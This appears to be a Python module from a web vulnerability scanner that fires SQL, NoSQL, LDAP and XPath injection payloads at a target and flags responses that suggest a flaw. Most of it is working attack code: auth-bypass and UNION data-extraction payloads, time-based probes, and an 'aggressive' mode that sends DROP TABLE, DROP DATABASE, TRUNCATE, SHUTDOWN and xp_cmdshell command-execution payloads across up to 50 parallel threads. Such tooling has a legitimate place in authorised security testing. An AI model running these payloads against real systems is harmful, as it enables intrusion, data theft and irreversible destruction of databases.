from typing import Any, Dict, List
import time
from ..http_client import HttpClient
from ..scenarios import SimpleScenario

def run_sqli_attack(client: HttpClient, scenario: SimpleScenario) -> Dict[str, Any]:
    # 1. Baseline - Establish "Safe" State
    baseline = client.send(scenario.method, scenario.target, json_body={"username": "test", "password": "password"}, is_canary=True)
    
    if baseline.status_code in [404, 405]:
        return {
            "scenario_id": scenario.id,
            "attack_type": "sql_injection",
            "passed": True,
            "skipped": True,
            "details": f"Endpoint {scenario.target} returned {baseline.status_code}. Path does not exist or is blocked. Skipping SQLi."
        }
        
    baseline_len = len(baseline.text)
    
    # Enhanced Payloads (Polyglots & Logic Tests)
    payloads = [
        {"payload": "' OR '1'='1", "type": "auth_bypass"},
        {"payload": "' OR 1=1 --", "type": "auth_bypass"},
        {"payload": "'/**/OR/**/1=1/**/--", "type": "auth_bypass"},
        {"payload": "'%20OR%201=1%20--", "type": "auth_bypass"},
        {"payload": "' OR true --", "type": "auth_bypass"},
        {"payload": "admin' --", "type": "auth_bypass"},
        {"payload": "admin' #", "type": "auth_bypass"},
        {"payload": "admin'/*", "type": "auth_bypass"},
        {"payload": "' UNION SELECT 1, 'BP_VULN', 3--", "type": "union"},
        {"payload": "'/**/UNION/**/SELECT/**/NULL,@@version,NULL--", "type": "union_extraction"},
        {"payload": "' AND 0 UNION SELECT 1,group_concat(table_name),3 FROM information_schema.tables--", "type": "union_extraction"},
        {"payload": "'; WAITFOR DELAY '0:0:5'--", "type": "time_based"}, 
        {"payload": "' OR SLEEP(5)--", "type": "time_based"},
        {"payload": "';SELECT PG_SLEEP(5)--", "type": "time_based"},
        {"payload": "') OR SLEEP(5) AND ('1'='1", "type": "time_based"},
        {"payload": "'", "type": "syntax_test"},
        {"payload": "';", "type": "syntax_test"},
        {"payload": "' AND 1=CONVERT(int,@@version) --", "type": "error_based"},
        {"payload": "1' ORDER BY 100--", "type": "error_based"},
        {"payload": "1' AND 1=1 --", "type": "boolean_blind"},
        {"payload": "1' AND 1=2 --", "type": "boolean_blind"},
        {"payload": "' AND 'a'='a", "type": "boolean_blind"},
        {"payload": "' AND 'a'='b", "type": "boolean_blind"},
        {"payload": "admin' AND 1=1 --", "type": "auth_bypass"},
        {"payload": "admin' AND 1=0 --", "type": "auth_bypass"},
        {"payload": "limit 1,1 --", "type": "syntax_test"},
        {"payload": "'-'", "type": "cve_blind"},
        {"payload": "'||'1", "type": "auth_bypass"}
    ]
    
    # 5. DESTRUCTIVE / SCHEMA MODIFICATION (Aggressive Mode & Extra)
    # 5. DESTRUCTIVE / SCHEMA MODIFICATION (Aggressive Mode & Extra)
    is_destructive = scenario.config.get("aggressive", False)
    if is_destructive:
        print("    [!!!] INJECTING DESTRUCTIVE SQL COMMANDS (DROP/TRUNCATE)")
        payloads.extend([
            {"payload": "'; DROP TABLE users; --", "type": "schema_modification"},
            {"payload": "'; DROP TABLE accounts; --", "type": "schema_modification"},
            {"payload": "'; DROP DATABASE test; --", "type": "schema_modification"},
            {"payload": "'; TRUNCATE TABLE users; --", "type": "schema_modification"},
            {"payload": "'; SHUTDOWN; --", "type": "schema_modification"},
            {"payload": "'; SHUTDOWN WITH NOWAIT; --", "type": "schema_modification"},
            {"payload": "'; EXEC xp_cmdshell('echo HACKED > C:\\hacked.txt'); --", "type": "rce_via_sqli"},
            {"payload": "' UNION SELECT NULL, NULL, NULL, NULL, NULL--", "type": "union_fuzz"},
            {"payload": "' UNION SELECT 1, 2, 3, 4, 5, 6, 7, 8, 9, 10--", "type": "union_fuzz"},
            {"payload": "' UNION SELECT @@version, user(), database()--", "type": "union_extraction"}
        ])
    
    fields = scenario.config.get("fields", ["username", "password", "id", "q"])
    variants = []
    
    issues_found = []
    leaked_data = []

    import concurrent.futures
    import threading
    
    lock = threading.Lock()
    
    def check_sqli(target_tuple):
        field, item = target_tuple
        p = item["payload"]
        ptype = item["type"]
        
        body = {"username": "test", "password": "password"}
        body[field] = p
        
        try:
            # Timing check
            start = time.time()
            resp = client.send(scenario.method, scenario.target, json_body=body)
            duration = time.time() - start
        except Exception:
            # Network/Proxy mismatch is NOT a vulnerability.
            return
        
        # --- DIFFERENTIAL ANALYSIS ---
        suspicious = False
        reasons = []
        
        lower_text = resp.text.lower()
        
        # 1. Error Reflection (Strict)
        err_sigs = [
            "you have an error in your sql syntax", 
            "unclosed quotation mark", 
            "postgresql query failed", 
            "sqlexception", 
            "ora-00933"
        ]
        if any(sig in lower_text for sig in err_sigs):
            suspicious = True
            reasons.append(f"SQL Error Exposed ({ptype})")
            with lock:
                leaked_data.append(f"Error: {resp.text[:150]}...")

        # 2. Boolean Blind / Auth Bypass Check
        if ptype == "auth_bypass":
            # If we see success markers
            if "welcome" in lower_text or "admin" in lower_text or "dashboard" in lower_text:
                if "welcome" not in baseline.text.lower():
                    suspicious = True
                    reasons.append("Auth Bypass Successful (New Content Detected)")

        # 3. Data Extraction (Union)
        if ptype == "union_extraction":
            indicators = ["ubuntu", "windows", "5.", "8.", "postgres", "sql server"]
            if any(i in lower_text for i in indicators) and not any(i in baseline.text.lower() for i in indicators):
                    suspicious = True
                    reasons.append("DB Version Extracted")
                    with lock:
                        leaked_data.append(f"[+] DATABASE BREACH: 'HACKED' - SQL Execution Confirmed\nExtracted: {resp.text[:100]}...")
        
        # 4. Time-Based Blind Logic
        baseline_latency = getattr(baseline, 'elapsed_ms', 100) / 1000.0
        
        if ptype == "time_based":
            # Only flag if duration is > 6s AND significantly higher than baseline (e.g. 5x slower)
            if duration > 6.0 and duration > (baseline_latency * 5):
                    suspicious = True
                    reasons.append(f"Time-Based SQLi Confirmed (Delay: {duration:.2f}s vs Baseline: {baseline_latency:.2f}s)")
        
        with lock:
            variants.append({"field": field, "payload": p, "status": resp.status_code})
            if suspicious:
                # Determine Confidence Level for this specific finding
                conf = "MEDIUM"
                if ptype in ["union_extraction", "error_based", "rce_via_sqli"]:
                    if any(sig in lower_text for sig in err_sigs): conf = "CONFIRMED" # Explicit Error
                    elif "test_value" in lower_text or "hacked" in lower_text: conf = "CONFIRMED" # Explicit Echo
                    else: conf = "HIGH"
                elif ptype == "time_based":
                    conf = "HIGH" # Strong timing signal
                elif ptype == "auth_bypass":
                    conf = "MEDIUM" # Heuristic (could be successful login or just same page)
                
                issues_found.append({"msg": f"[CRITICAL] SQLi in '{field}': {', '.join(reasons)}", "confidence": conf, "payload": p})

    # BUILD TASK LIST
    tasks = []
    for field in fields:
        for item in payloads:
            tasks.append((field, item))
            
    # EXECUTE PARALLEL (High Speed)
    # Using 15 threads max for SQLi to avoid flooding database connections too hard if local
    # But user asked for "FAST AS FUCK", so let's push it.
    pool_size = 50 if scenario.config.get("aggressive") else 20
    
    with concurrent.futures.ThreadPoolExecutor(max_workers=pool_size) as executor:
        list(executor.map(check_sqli, tasks))

    # Calculate Max Confidence
    confidence_levels = {"CONFIRMED": 4, "HIGH": 3, "MEDIUM": 2, "LOW": 1}
    max_conf = "LOW"
    max_score = 0
    top_payload = None
    
    final_issues = []
    
    for issue in issues_found:
        final_issues.append(issue["msg"])
        score = confidence_levels.get(issue["confidence"], 1)
        if score > max_score:
            max_score = score
            max_conf = issue["confidence"]
            top_payload = issue.get("payload")

    return {
        "scenario_id": scenario.id,
        "attack_type": "sql_injection",
        "passed": len(final_issues) == 0,
        "confidence": max_conf if final_issues else "LOW",
        "details": {
            "issues": final_issues,
            "reproduction_payload": top_payload,
            "leaked_data": list(set(leaked_data))
        }
    }

def run_nosql_injection(client: HttpClient, scenario: SimpleScenario) -> Dict[str, Any]:
    """
    Checks for NoSQL Injection (MongoDB/etc) using logical operators.
    Payload: {"$ne": null}, {"$gt": ""}
    """
    payloads = [
        {"$ne": None},
        {"$ne": "invalid_value_check_bypass"},
        {"$gt": ""}
    ]
    
    issues = []
    # Basic check against fields
    fields = scenario.config.get("fields", ["username", "password", "email"])
    
    for field in fields:
        for p in payloads:
            # POST JSON Injection
            if scenario.method == "POST":
                resp = client.send("POST", scenario.target, json_body={field: p})
                # If we get a 200 OK and it looks like a successful login/bypass compared to baseline error
                if resp.status_code == 200 and "error" not in resp.text.lower():
                     # Weak heuristic, but sufficient for basic check
                     pass # Hard to verify without clear error or success indicator. 
                     # Let's check if the response is DIFFERENT from a known bad login.
    
    # Simple Query Param Injection
    # ?username[$ne]=dummy
    # This is often framework specific (Express/qs).
    qs = {"username[$ne]": "dummy", "password[$ne]": "dummy"}
    resp = client.send("GET", scenario.target, params=qs)
    
    if resp.status_code == 200 and ("dashboard" in resp.text.lower() or "welcome" in resp.text.lower()):
        issues.append("NoSQL Injection (MongoDB Operator) successful (Auth Bypass Suspected).")

    return {
        "scenario_id": scenario.id,
        "attack_type": "nosql_injection",
        "passed": len(issues) == 0,
        "details": {"issues": issues}
    }

def run_ldap_injection(client: HttpClient, scenario: SimpleScenario) -> Dict[str, Any]:
    """
    Checks for LDAP Injection.
    Payload: * )(&
    """
    payload = "*)(cn=*))"
    resp = client.send("GET", scenario.target, params={"user": payload})
    issues = []
    if resp.status_code == 200 and ("root" in resp.text.lower() or "admin" in resp.text.lower()):
        issues.append("LDAP Injection: Wildcard returned suspicious content.")
        
    return {
        "scenario_id": scenario.id,
        "attack_type": "ldap_injection",
        "passed": len(issues) == 0,
        "details": {"issues": issues}
    }

def run_xpath_injection(client: HttpClient, scenario: SimpleScenario) -> Dict[str, Any]:
    """
    Checks for XPath Injection.
    """
    payload = "' or '1'='1"
    resp = client.send("GET", scenario.target, params={"q": payload})
    issues = []
    if "syntax error" in resp.text.lower() or "xpath" in resp.text.lower():
        issues.append("XPath Injection: Syntax error revealed.")
        
    return {
        "scenario_id": scenario.id,
        "attack_type": "xpath_injection",
        "passed": len(issues) == 0,
        "details": {"issues": issues}
    }
